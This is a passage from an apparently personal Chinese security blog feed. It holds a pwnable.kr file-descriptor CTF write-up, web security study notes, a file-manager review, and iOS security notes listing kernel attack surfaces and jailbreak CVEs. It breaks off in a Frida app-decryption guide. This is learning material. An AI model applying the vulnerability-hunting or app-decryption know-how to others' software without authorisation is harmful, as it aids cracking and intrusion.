class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line">        <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">        len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">"LETMEWIN\n"</span>, buf))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"good job :)\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"learn about Linux file IO\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="题目要点"><a href="#题目要点" class="headerlink" title="题目要点"></a>题目要点</h3><p>作为第一个题目，主要的知识点是让我们掌握C语言的文件IO标识符，open和read（题目中）。</p><p>关注题目中的以下几个要点：</p><ul><li><p>主函数中的参数</p><ul><li>argc 保存的是命令行中总的参数个数，并且包含程序名。 e.g. <code>./test 1 2 3 4</code>，那么，argc的值即为 5</li><li>agrv[] 数组中保存传入的参数，参数可以是多个的，e.g. <code>./test 1 2 3</code>，那个argv[0] == 1, argv[1] == 2, argv[2] == 3</li><li>envp[] 数组中保存系统的环境变量，操作系统运行程序时，通过envp参数将系统环境变量传递给程序</li></ul></li><li><p>atoi() 函数</p><ul><li>该函数（atoi, ascii to integer）会将字符串转化为整数</li><li>函数会扫描输入的参数，跳过空白字符（空格、tab缩进等），将数字的字符转为整型，如果无法有效转换（字符串以英文字母开头），则会返回0</li><li>注意，函数会保留+-符号，但会舍弃小数点及后面的数字</li></ul></li><li><p>read() 函数</p><ul><li><p><code>ssize_t read (int fd, void *buf, size_t count);</code></p></li><li><p>功能：用于从文件描述符（fd, file description）对应的文件读取数据（从打开的设备或文件中读取数据，也可以为终端上的数据）</p></li><li><p>在UNIX/Linux平台上，fd有三个（fd = 0, fd = 1; fd = 2），分别对应控制台(Console)的标准输入，标准输出，标准错误输出</p></li><li><p>e.g. 在<code>read(0,buf,32)</code> 中，fd=0，表示进行标准输入（控制台，键盘输入），读取最多32个字节到buf中</p></li><li><p>常规的用途是配合open()函数，实现文件的读取</p></li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> fp = open(<span class="string">"./test.txt"</span>, O_RDONLY); <span class="comment">//只读模式打开文件</span></span><br><span class="line">res = read(fp, buffer, <span class="number">60</span>);</span><br></pre></td></tr></table></figure><ul><li><p>strcmp() 函数</p><ul><li><code> int strcmp(const char *s1, const char *s2);</code></li><li>功能：比较字符串s1与字符串s2，区分大小写，相同返回0，不同则返回s1与s2的差值</li></ul></li><li><p>system() 函数</p><ul><li><code> int system(char *command);</code></li><li>功能：发出一个terminal命令</li></ul></li><li><p>补充：open() 函数</p><ul><li><p><code>int open(const char *path, int oflags,mode_t mode);</code></p></li><li><p>功能：用于建立了一条到文件或设备的访问路径，配合read()等函数，实现文件的读写和设备的操作</p></li></ul></li></ul><h3 id="重要补充：文件权限"><a href="#重要补充：文件权限" class="headerlink" title="重要补充：文件权限"></a>重要补充：文件权限</h3><p>在题目中，我们以fd的用户身份登入，我们的操作都是受身份限制的，因此我们需要对题目中的文件进行权限的识别。使用<code>groups fd</code>判断fd用户所属的组为fd。使用命令<code>ls -l</code>可以查看当年目录下的所有文件的权限：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-r-sr-x--- 1 fd_pwn fd   7322 Jun 11  2014 fd</span><br><span class="line">-rw-r--r-- 1 root   root  418 Jun 11  2014 fd.c</span><br><span class="line">-r--r----- 1 fd_pwn root   50 Jun 11  2014 flag</span><br></pre></td></tr></table></figure><p>依次分析：</p><ul><li><p>权限：前面由连字符和字母组成的部分，例如<code>-r-sr-x---</code>， 该部分由四个部分组成，共占10位(1 + 3 + 3 + 3)</p><ul><li><table><thead><tr><th>类型</th><th>所有者权限</th><th>所属组权限</th><th>其他人权限</th></tr></thead><tbody><tr><td>-</td><td>r   -   s</td><td>r   -   x</td><td>-   -   -</td></tr></tbody></table><ul><li><p>类型部分</p><p><code>-</code> 代表文件</p><p><code>d</code> 代表目录</p><p><code>l</code> 代表链接</p><p><code>c</code> 代表字符型设备</p><p><code>b</code> 代表块设备</p><p><code>n</code> 代表网络设备</p></li><li><p>权限部分</p><p><code>-</code> 权限为空</p><p><code>r</code> 可读</p><p><code>w</code> 可写</p><p><code>x</code> 可执行</p><p><code>s</code> 当执行该文件时将具有该文件所有者的权限，注意这个，比较特殊</p></li></ul></li></ul></li></ul><ul><li><p>所有者：例如fd_pwn，表示fd文件的所有者是fd_pwn</p><ul><li>分析第一条，可以发现fd和目标文件flag是同一个所有者</li></ul></li><li><p>所属组：例如fd, 表示fd文件所属组是fd，同一个组中的有不同的用户/角色</p><ul><li>继续分析第一条，可以发现fd和flag是不是同一个组，flag属于root组</li></ul></li><li><p>文件大小</p></li><li><p>创建事件</p></li><li><p>文件名称</p></li></ul><hr><p>综合以上的条件，我们分析目标文件flag，可以得出：</p><ul><li>flag是文件</li><li>flag的权限为：所有者可读；所属组可读；其他人无权限</li><li>flag的所有者为：fd_pwn</li><li>flag的所属组为：root</li></ul><p>分析我们可以利用的二进制可执行文件fd可以发现：</p><ul><li><p>fd是文件</p></li><li><p>fd的权限为：所有者可读，并且当执行该文件时将具有该文件所有者的权限；所属组可读可执行；其他人无权限</p></li><li><p>fd的所有者为fd_pwn</p></li><li><p>fd的所有组为fd，注意，这里很重要, 可以发现我们登入使用的用户fd属于用户组fd，与该文件相同。结合文件权限中表明的，所属组可以执行该文件，并且执行该文件时可以获取该文件所有者的权限，而文件fd与文件flag属于同一个所有者fd_pwn, 文件flag的所有者可以读取文件flag。</p><p>那么，我们的用户fd就可以执行文件fd，暂时获取所有者fd_pwn的权限，进而可以读取文件flag</p></li></ul><p>总结一下，在Linux/Unix中一切皆文件，弄清楚文件的权限，我们的角色，才可以明确我们想进行的操作，一切从实际出发，而思维又要高于实际。</p><h3 id="题目总结"><a href="#题目总结" class="headerlink" title="题目总结"></a>题目总结</h3><p>这是第一道题目，主要考察文件IO的知识点。在分析过程中，我们不经要去看程序代码，更要注意理清文件权限和我们的角色，这样才能更加明确总体的思路。</p><p>在做题或者分析的过程中，我们的第一步不是直接去分析程序文件，而是要查看当前用户角色和文件权限，明确自己可以做什么，不可以做什么，这会更好地帮助我们组织后面的操作。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 系统安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>读《白帽子讲web安全》的思考和整理【updating】</title>
      <link href="/2020/03/27/%E8%AF%BB%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8%E3%80%8B%E7%9A%84%E6%80%9D%E8%80%83%E5%92%8C%E6%95%B4%E7%90%86/"/>
      <url>/2020/03/27/%E8%AF%BB%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8%E3%80%8B%E7%9A%84%E6%80%9D%E8%80%83%E5%92%8C%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="读《白帽子讲Web安全》的思考-updating"><a href="#读《白帽子讲Web安全》的思考-updating" class="headerlink" title="读《白帽子讲Web安全》的思考[updating]"></a>读《白帽子讲Web安全》的思考[updating]</h1><h2 id="安全基础与理论"><a href="#安全基础与理论" class="headerlink" title="安全基础与理论"></a>安全基础与理论</h2><h3 id="安全三要素"><a href="#安全三要素" class="headerlink" title="安全三要素"></a>安全三要素</h3><ul><li>机密性（Confidentiality）</li><li>完整性（Integrity）</li><li>可用性（Availability）</li></ul><h2 id="安全评估过程"><a href="#安全评估过程" class="headerlink" title="安全评估过程"></a>安全评估过程</h2><h3 id="1-资产等级划分"><a href="#1-资产等级划分" class="headerlink" title="1. 资产等级划分"></a>1. 资产等级划分</h3><p>明确目标是什么，需要保护什么</p><h3 id="2-威胁分析"><a href="#2-威胁分析" class="headerlink" title="2. 威胁分析"></a>2. 威胁分析</h3><ul><li>威胁（Threat）：表示可能的危害<strong>来源</strong><ul><li>对比，风险（Risk）：表示可能造成的<strong>损失</strong></li></ul></li><li>威胁建模<ul><li>e.g. 微软的STRIDE模型<ul><li>Spoofing</li><li>Tampering</li><li>Repudiation</li><li>Information Disclosure</li><li>Denial of Service</li><li>Elevation of Privilege</li></ul></li></ul></li></ul><h3 id="3-风险分析"><a href="#3-风险分析" class="headerlink" title="3. 风险分析"></a>3. 风险分析</h3><blockquote><p>Risk = Probability * Damage Potential</p></blockquote><ul><li>风险模型<ul><li>e.g. 微软的DREAD模型<ul><li>Damage Potential</li><li>Reproducibility（再现性）</li><li>Exploitability（可利用性）</li><li>Affected Users</li><li>Discoverability（可发现性）</li></ul></li></ul></li></ul><h2 id="白帽兵法（安全原则）"><a href="#白帽兵法（安全原则）" class="headerlink" title="白帽兵法（安全原则）"></a>白帽兵法（安全原则）</h2><h3 id="最小权限原则"><a href="#最小权限原则" class="headerlink" title="最小权限原则"></a>最小权限原则</h3><p>只授予主体必要的权限，而不要过度授权</p><h3 id="纵深防御原则"><a href="#纵深防御原则" class="headerlink" title="纵深防御原则"></a>纵深防御原则</h3><p>深入，分层设计；有针对性</p><h3 id="数据与代码分离原则"><a href="#数据与代码分离原则" class="headerlink" title="数据与代码分离原则"></a>数据与代码分离原则</h3><ul><li><p>一个互联网应用场景里涉及到的数据，宽泛地来讲，可以分为：用户数据 和 程序代码。而用户数据里有可分为普通数据和恶意数据。</p></li><li><p>该原则就是要求用户数据与程序代码分离，隔断恶意用户数据与程序代码的交互，进而保护这个应用场景。</p></li><li><p>对很对Web安全问题都可以采用该原则进行改进，比如XSS, SQL Injection, CRLF Injection, X-Path Injection</p></li></ul><h3 id="不可预测原则"><a href="#不可预测原则" class="headerlink" title="不可预测原则"></a>不可预测原则</h3><ul><li><p>针对基于篡改、伪造的攻击很有效。</p></li><li><p>前三个原则是从漏洞形成的角度出发，该原则从对抗攻击方法的角度出发（我知道我的程序代码有问题，但我不修复，我让你的攻击无效）</p></li><li><p>比如，让攻击者不能完整地知道所要篡改的、伪造的数据。在CSRF（跨站请求伪造）防御时，开发者使得请求中带有一部分无法或者很难预测、猜解的token（一串数值），并且这个token在每个客户端上都不相同，服务端也会进行验证。这样，攻击者伪造可信用户的请求难度就大大增加了。</p></li></ul><h2 id="浏览器安全"><a href="#浏览器安全" class="headerlink" title="浏览器安全"></a>浏览器安全</h2><h3 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h3><ul><li><p>首先要明确，同源策略<strong>保护的主体</strong>是浏览器（也是客户端）；所<strong>限制的主体</strong>是当前访问的网站；所<strong>保护的内容</strong>是其它源的资源（e.g. JS脚本、CSS等）</p></li><li><p>一句话，加载的资源所在的源必须是同一个源</p><ul><li>比如，用户访问的网页是a网站，<code>http://a.com</code>加载的资源是一张a网站页面的一张图片，来自b网站 <code>&lt;img src=http://b.com/pic.png&gt;</code></li><li>在加载该图片时，显示在的页面是a网站的，而不是b网站的</li><li>虽然进行了跨域资源访问，但浏览器限制了a网站，使其不能读写b图片。虽然在客户端加载，但网站本身无法读写该资源</li></ul></li><li><p>浏览器需要判断加载的资源是否可信，根据最小权限原则分析，在使用Web服务时，主体自然就是该网站，网站使用的源（host，域名或IP、子域名、端口、协议）来确定唯一身份。最小权限原则要求授予主体必要的权限，而不授予主体过度的权限。</p></li><li><p>那么对于该网站，浏览器不在意资源文件所在的域是什么，重要的是加载资源文件页面所在的域是什么</p><ul><li><p>比如图片资源，存放在OSS中，图片链接的源与当前页面的源不同。但浏览器请求图片资源，跨域调用图片，图片加载时所在的源还是当前页面。并且由于该策略，网站不能读、不能写不同源的资源。加载是在浏览器/客户端完成的。</p></li><li><p>简单地说，设想一个场景，如果网站可以读、写不同源的资源，那么一个恶意网站，就可以调用你支付宝网页登入界面，并且在你输入账号密码时进行读取。</p><p>注意这里最重要的两个特征：</p><ul><li>跨域访问资源，加载资源的页面不是同源的</li><li>浏览器放任不同源的网页互相读写数据</li></ul><p>这样就造成了危害，因此反向思考，这两个特征的否定就是同源策略所作的事情</p></li></ul></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>标签型文件管理器的试用</title>
      <link href="/2020/03/17/%E6%A0%87%E7%AD%BE%E5%9E%8B%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E5%99%A8%E7%9A%84%E8%AF%95%E7%94%A8/"/>
      <url>/2020/03/17/%E6%A0%87%E7%AD%BE%E5%9E%8B%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E5%99%A8%E7%9A%84%E8%AF%95%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="标签型文件管理器的试用"><a href="#标签型文件管理器的试用" class="headerlink" title="标签型文件管理器的试用"></a>标签型文件管理器的试用</h1><p>以前不太注意电脑中的文件管理，觉得用Listary + Everything或者Alfred(macOS) 进行文件搜索是非常快捷的。进行文件归档时只要有耐心给每个文件夹进行细致地命名，还是容易理清脉络搜索的。</p><p>但是文件一多，不同的文件具有不同的时效性、重要性，尤其是在阅读一些情报文件时，有些重要的文件，需要大把时间去细致阅读，有些简短的文件，大概阅读后，需要做个标记，方便后面进行聚合分析等等，会对不同的文件有很多不同的管理需求。</p><p>此时用文件夹进行归类时，就不得不在文件夹中写每个对应文件的README文件，做好记录。（其实这是最保险的方法，使用文件管理工具都可能出错，使用独立的文件保存信息更保险，对重要的敏感文件可以用这种方法）。</p><p>但，“懒”是第一生产力，使用标签型文件管理工具（类似macOS中的Finder），可以很快速地进行文件标识、描述，进而设置TODO等时效设置。下面介绍自己简单试用的几种。</p><h2 id="TagSpaces"><a href="#TagSpaces" class="headerlink" title="TagSpaces"></a>TagSpaces</h2><p>官网：<a href="https://www.tagspaces.org/products/webclipper/" target="_blank" rel="noopener">Link</a></p><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200317152343.png"></p><ul><li><p>优点</p><ul><li>界面简洁清新，UI设计较好</li><li>使用简易，上手快，就像是普通的文件管理器的加强版</li><li>开源，有社区版，高级版本和企业版需付费（按年订阅）</li><li>支持macOS、Window、Linux</li></ul></li><li><p>缺点</p><ul><li>文件浏览方式比较单一，列表形式和网格形式（但同时也比较简洁）</li><li>没有找到Q-Dir一样的多窗口浏览功能</li><li>社区版功能较少，但够用</li></ul></li></ul><h2 id="tagLyst"><a href="#tagLyst" class="headerlink" title="tagLyst"></a>tagLyst</h2><p>官网：<a href="http://www.taglyst.com/" target="_blank" rel="noopener">Link</a> 官网没有启用HTTPS，这年头，这种情况印象分先降一半 2333</p><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200317154954.png"></p><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200317155150.png"></p><ul><li>优点<ul><li>以资料库的形式整合，有点像是”文件夹式笔记本“的感觉，管理起来比较直观</li><li>文件浏览方式多，卡片式（有部分预览）、列表式、”灵感流“等</li><li>国内公司开发，功能贴近国内用户需求</li><li>支持买断制付费，价格良心</li></ul></li><li>缺点<ul><li>缺少Linux端</li><li>功能不够简易直观，有些操作逻辑上存在问题</li><li>LOGO和UI设计比较经典，设计上不够简洁美观（个人感觉）</li></ul></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="懒人方式"><a href="#懒人方式" class="headerlink" title="懒人方式"></a>懒人方式</h3><p>不想进行很多地文件归类，对标签、文件的标识需求不是特别大的用户，完全可以使用 Listary + Everything 这两款软件组合的方式。一个进行文件管理索引，一个进行精准的文件搜索</p><h3 id="标签式轻度用户"><a href="#标签式轻度用户" class="headerlink" title="标签式轻度用户"></a>标签式轻度用户</h3><p>对标签式文件管理有轻度需求，想直接把软件当作主要的文件浏览器的用户，可以使用TagSpaces，简洁易上手，社区版也够轻度使用。</p><h3 id="标签式重量用户"><a href="#标签式重量用户" class="headerlink" title="标签式重量用户"></a>标签式重量用户</h3><p>对文件管理追求专业、系统的用户，想要通过文件管理器梳理自己的知识体系的用户，可以使用tagLyst，需要付费，但价格良心（在疫情期间，对医疗工作者 / 医科学生有限时优惠活动，感觉团队还是很不错的！）</p>]]></content>
      
      
      
        <tags>
            
            <tag> 工具相关 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iOS应用安全学习——文件结构</title>
      <link href="/2020/03/12/iOS%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/"/>
      <url>/2020/03/12/iOS%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h1 id="iOS应用安全学习—文件结构"><a href="#iOS应用安全学习—文件结构" class="headerlink" title="iOS应用安全学习—文件结构"></a>iOS应用安全学习—文件结构</h1><p>此章节主要梳理了iOS的重要文件路径和Math-O文件格式相关知识点</p><h2 id="iOS系统目录"><a href="#iOS系统目录" class="headerlink" title="iOS系统目录"></a>iOS系统目录</h2><h3 id="UNIX传统目录"><a href="#UNIX传统目录" class="headerlink" title="UNIX传统目录"></a>UNIX传统目录</h3><ul><li><p>/bin</p></li><li><p>/boot</p></li><li><p>/dev</p></li><li><p>/etc —— 符号链接，指向/private/etc</p></li><li><p>/lib —— iOS中为空</p></li><li><p>/mnt —— iOS中为空</p></li><li><p>/sbin</p></li><li><p>/tmp —— 符号链接，指向/private/var/tmp</p></li><li><p>/usr</p></li><li><p>/var</p></li></ul><h3 id="iOS特有目录"><a href="#iOS特有目录" class="headerlink" title="iOS特有目录"></a>iOS特有目录</h3><ul><li>/Application —— 此路径是越狱商店安装APP的路径，从APP Store下载的程序安装在<code>/var/mobile/Containers/Bundle/Application</code></li><li>/Developer</li><li>/Library</li><li>/System —— 是系统中最重要的目录</li><li>/User</li></ul><h2 id="iOS沙盒结构"><a href="#iOS沙盒结构" class="headerlink" title="iOS沙盒结构"></a>iOS沙盒结构</h2><p>沙盒（Sanbox）是把应用程序生成和修改的文件重定向到自身文件夹中。在沙盒机制下，每个程序之间的文件夹不能互相访问。iOS采用该机制。</p><p>iOS应用程序在安装时会创建属于自己的沙盒文件，沙盒根目录下有三个文件夹。分别为</p><ul><li>Document —— 存放应用程序的数据</li><li>Library<ul><li>Preferences</li><li>Caches</li></ul></li><li>tmp</li></ul><h2 id="iOS应用结构"><a href="#iOS应用结构" class="headerlink" title="iOS应用结构"></a>iOS应用结构</h2><ul><li><p>Payload —— 存放.app文件夹，是真正的包内容</p></li><li><p>XXX.app</p><ul><li><p>Info.plist</p><ul><li>Bundle identifier</li><li>Executable file —— 该参数所对应的可执行文件就是目标文件，也就是逆向工程所针对的</li></ul></li><li><p>*.lproj —— 存放本地化的字符串(.strings)，是逆向工程寻找切入点的途径之一</p></li><li><p>资源文件</p></li><li><p>Frameworks —— 当前应用中使用的一些第三方框架或Swift动态库</p></li><li><p>PlugIns —— 当前应用的扩展文件</p></li><li><p>Watch —— 如果当前应用支持Apple Watch，则会有此文件夹及对应的应用</p></li></ul></li></ul><hr><h2 id="Mach-O-文件格式"><a href="#Mach-O-文件格式" class="headerlink" title="Mach-O 文件格式"></a>Mach-O 文件格式</h2><p>// TODO</p>]]></content>
      
      
      
        <tags>
            
            <tag> iOS安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iOS安全入门与进阶</title>
      <link href="/2020/03/04/iOS%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E4%B8%8E%E8%BF%9B%E9%98%B6/"/>
      <url>/2020/03/04/iOS%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E4%B8%8E%E8%BF%9B%E9%98%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="iOS安全入门与进阶"><a href="#iOS安全入门与进阶" class="headerlink" title="iOS安全入门与进阶"></a>iOS安全入门与进阶</h1><p>安全学习很难，但，山顶很高，哪怕失败了，也证明你爬过了高山，而不是在土丘上登顶。土丘容易被铲平，而高山不会，你挑战的目标就是你挑战的见证。</p><p>这是鸡汤还是警句，就取决于你有没有行动。让那些一笑而过的人成为历史的沙砾吧。你、我会书写历史。</p><h2 id="iOS架构"><a href="#iOS架构" class="headerlink" title="iOS架构"></a>iOS架构</h2><h3 id="iOS安全研究的动力"><a href="#iOS安全研究的动力" class="headerlink" title="iOS安全研究的动力"></a>iOS安全研究的动力</h3><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200228163618.png"><br>图：移动平台0day漏洞赏金榜，来自<a href="https://zerodium.com/program.html" target="_blank" rel="noopener">Zerodium</a></p><h3 id="iOS-Security"><a href="#iOS-Security" class="headerlink" title="iOS Security"></a>iOS Security</h3><p>Apple会发布iOS安全架构的白皮书：</p><ul><li>Apple Developer Documentation: <a href="https://developer.apple.com/documentation/security" target="_blank" rel="noopener">Link</a></li><li>iOS  Security, iOS12.3, 2019: <a href="https://www.apple.com/tr/business/docs/site/iOS_Security_Guide.pdf" target="_blank" rel="noopener">Link</a></li></ul><h3 id="iOS安全技术演进"><a href="#iOS安全技术演进" class="headerlink" title="iOS安全技术演进"></a>iOS安全技术演进</h3><ul><li><p>Isolation</p></li><li><p>Restricted Sanbox</p><ul><li>默认的沙盒规则为Container</li><li>所有从App Store下载的APP，第一次打卡应用时，询问用户访问控制是否给予权限</li><li>沙盒内的应用和内核的交互非常窄</li><li>沙箱内的应用只能访问几个有限的内核模块 [TODO，哪几个？]</li></ul></li><li><p>Code Signing</p></li><li><p>Apple上的代码签名验证很严格</p></li><li><p>Expoloit Mitigation(ASLR, DEP)</p></li><li><p>Data Protection</p><ul><li>Passcode 屏幕锁、指纹识别、FaceID？TODO</li><li>很多敏感数据只有在正确的passcode输入后，才会生成有效的解密key</li><li>iPhone5S后，有一个专门的硬件芯片负责Passcode的计算、生成Passcode Key和Passcode输入错误次数的检测（从硬件上进行的防范）</li></ul></li><li><p>Hypervisor</p><ul><li>iOS 9之后</li><li>会检查内核代码段的完整性 Kernel Patch Protection</li></ul><p>iOS安全体系经历了从无到有，从弱到强的发展，其中也得益于硬件芯片的发展。</p></li></ul><h2 id="iOS（通用）漏洞挖掘"><a href="#iOS（通用）漏洞挖掘" class="headerlink" title="iOS（通用）漏洞挖掘"></a>iOS（通用）漏洞挖掘</h2><h3 id="1-识别Attack-Surface"><a href="#1-识别Attack-Surface" class="headerlink" title="1.识别Attack Surface"></a>1.识别Attack Surface</h3><p>先明确哪些地方会接受数据，识别<strong>攻击面</strong></p><h4 id="iOS本地攻击面"><a href="#iOS本地攻击面" class="headerlink" title="iOS本地攻击面"></a>iOS本地攻击面</h4><ul><li><p>USB</p><ul><li>文件访问接口</li><li>备份还原接口<ul><li>问题比较多，被大量分析的一个接口</li></ul></li><li>应用管理接口<ul><li>安装一个IPA包时，通过PC端上传一个包给iOS，iOS中有一个installd的守护进程，在解压缩IPA包时，需要时间，此时可以造成一个竞争条件漏洞</li><li>参考：<a href="https://www.mottoin.com/detail/2519.html" target="_blank" rel="noopener">IORegistryIterator竞争条件漏洞分析与利用</a> TODO</li></ul></li><li>开发者接口<ul><li>配合Xcode </li></ul></li></ul></li><li><p>安装的应用</p><ul><li>JekyII 类型应用（USENIX Security’13）</li><li>Masque Attacks（FireEye Research）</li></ul></li><li><p>接口漏洞资料</p><ul><li>《是谁推开我的“窗”：iOS App接口安全分析》，长亭科技：<a href="https://zhuanlan.zhihu.com/p/76707111" target="_blank" rel="noopener">Link</a> TODO</li></ul></li></ul><h4 id="用户态远程攻击面分析"><a href="#用户态远程攻击面分析" class="headerlink" title="用户态远程攻击面分析"></a>用户态远程攻击面分析</h4><ul><li>任何网络连接都有可能成为攻击面<ul><li>Mobile Safari<ul><li>JailbreakMe</li><li>Mobile Pwn2Own</li></ul></li><li>Messager    研究iMessage黑产漏洞信息 [TODO, 重要]<ul><li>🎯CEV-2009-2204, SMS vulnerability, Charlie Miller </li><li>🎯CVE-2015-1157, crafted Unicode text reboot bug</li></ul></li><li>系统中的网络服务进程<ul><li>🎯CVE-2015-1118, crafted configuration profile reboot bug</li></ul></li></ul></li></ul><h4 id="内核攻击面分析"><a href="#内核攻击面分析" class="headerlink" title="内核攻击面分析"></a>内核攻击面分析</h4><ul><li><p>用户态和内核的任何通信渠道都是潜在的攻击面。对于内核来说，可以默认流入的数据都是有害的</p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200304134450.png" style="zoom: 67%;" /><p>进一步细分</p></li></ul><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200304212337.png"></p><p>ioctl</p><p>File System</p><p>Devices</p><p>IOkit：macOS和iOS上的驱动内核扩展总称</p><p>MIG：负责用户态到内核态的数据交互</p><ul><li><p>文件系统（File System）</p><ul><li>🎯HFS legacy volume（） name stack buffer overflow<ul><li>JailbreakME 3 for iOS 4.2.x</li></ul></li><li>🎯HFS heap overflow <ul><li>Corona for iOS 5.0</li></ul></li></ul></li><li><p>POSIX系统调用</p><ul><li>posix_spawn 处理file action data的整数溢出漏洞</li><li>p0sixspwn for iOS 6.1.3</li></ul></li><li><p>ioctl</p><ul><li>Packet Filter Kernel Exploit<ul><li>🎯DIOCADDRULE ioctl 处理函数未初始化变量漏洞<ul><li>可以使任意内核地址的内容减一</li></ul></li><li>🎯limera1n/greenpois0n for iOS 4.1</li></ul></li></ul></li><li><p>设备 /dev/*</p><ul><li>🎯ptmx_get_ioctl 内存越界访问漏洞<ul><li>ptmx设备在处理minor参数的时候没有做越界检测</li><li>evasi0n7 for 7.0.x</li></ul></li></ul></li><li><p>🎯IOKit（很多）</p><ul><li>IOSurface</li><li>IOMobileFrameBuffer（越狱漏洞，2017年，iOS10，堆溢出）</li><li>IOUSBDeviceFamily：<a href="https://www.theiphonewiki.com/wiki/IOUSBDeviceFamily_Vulnerability" target="_blank" rel="noopener">Link</a> ，最终可以实现RCE</li><li>IOShareDataQueue</li><li>IOHIDFamily，开源模块，漏洞很多</li><li>…</li></ul></li></ul><h3 id="2-理解数据交互过程"><a href="#2-理解数据交互过程" class="headerlink" title="2.理解数据交互过程"></a>2.理解数据交互过程</h3><p>非常关键，读源码，明确用户态和内核态的交互过程</p><h3 id="3-审计代码实现和逻辑"><a href="#3-审计代码实现和逻辑" class="headerlink" title="3.审计代码实现和逻辑"></a>3.审计代码实现和逻辑</h3><p>审计、发现代码缺陷</p><h3 id="4-挖掘漏洞构造触发样本"><a href="#4-挖掘漏洞构造触发样本" class="headerlink" title="4.挖掘漏洞构造触发样本"></a>4.挖掘漏洞构造触发样本</h3><p>构造、使用POC进行验证</p><p>自动化挖掘（静态、动态）</p><h2 id="iOS消息机制漏洞样例分析"><a href="#iOS消息机制漏洞样例分析" class="headerlink" title="iOS消息机制漏洞样例分析"></a>iOS消息机制漏洞样例分析</h2><h2 id="iOS内核态漏洞分析"><a href="#iOS内核态漏洞分析" class="headerlink" title="iOS内核态漏洞分析"></a>iOS内核态漏洞分析</h2>]]></content>
      
      
      
        <tags>
            
            <tag> iOS安全入门与进阶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iOS应用脱壳</title>
      <link href="/2020/03/01/iOS%E5%BA%94%E7%94%A8%E8%84%B1%E5%A3%B3/"/>
      <url>/2020/03/01/iOS%E5%BA%94%E7%94%A8%E8%84%B1%E5%A3%B3/</url>
      
        <content type="html"><![CDATA[<h1 id="iOS应用脱壳"><a href="#iOS应用脱壳" class="headerlink" title="iOS应用脱壳"></a>iOS应用脱壳</h1><h2 id="基于Frida的脱壳方法"><a href="#基于Frida的脱壳方法" class="headerlink" title="基于Frida的脱壳方法"></a>基于Frida的脱壳方法</h2><p>主要参考：<a href="https://www.jianshu.com/p/4aee1c07d1da" target="_blank" rel="noopener">Link</a></p><h3 id="frida-ios-dump"><a href="#frida-ios-dump" class="headerlink" title="frida-ios-dump"></a><strong><a href="https://github.com/AloneMonkey/frida-ios-dump" target="_blank" rel="noopener">frida-ios-dump</a></strong></h3><ul><li><p>步骤1: 在手机上安装Frida，分为越狱设备和非越狱设备两种。参见官方文档：<a href="https://frida.re/docs/ios/#without-jailbreak" target="_blank" rel="noopener">Link</a></p></li><li><p>步骤2: 在mac上安装Frida</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python API binding</span></span><br><span class="line">$ pip install frida</span><br><span class="line"><span class="comment"># frida command</span></span><br><span class="line">$ pip install frida-tools</span><br></pre></td></tr></table></figure><p>注意：在安装<code>frida-tools</code>时，出现了报错<code>ERROR: No matching distribution found for prompt-toolkit&lt;4.0.0,&gt;=3.0.3 (from frida-tools)</code>，单独安装 prompt后<code>pip install prompt</code>后发现没有影响，原因可参考另一项目的<a href="https://github.com/sensepost/objection/issues/179" target="_blank" 